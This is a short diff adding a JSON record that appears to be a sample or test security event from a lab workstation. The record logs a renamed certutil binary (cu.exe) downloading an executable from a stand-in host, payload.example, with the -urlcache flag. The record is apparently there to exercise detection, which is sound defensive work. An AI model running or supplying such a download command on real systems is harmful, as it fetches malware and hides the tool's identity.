@@ -1,0 +1,8 @@
+{
+  "hostname": "WS-OPS-0419",
+  "user": "LAB\\r.lindqvist",
+  "file_path": "C:\\Users\\Public\\cu.exe",
+  "original_file_name": "certutil.exe",
+  "command_line": "cu.exe -urlcache -f http://payload.example/a.exe a.exe",
+  "parent_process": "C:\\Windows\\System32\\cmd.exe"
+}
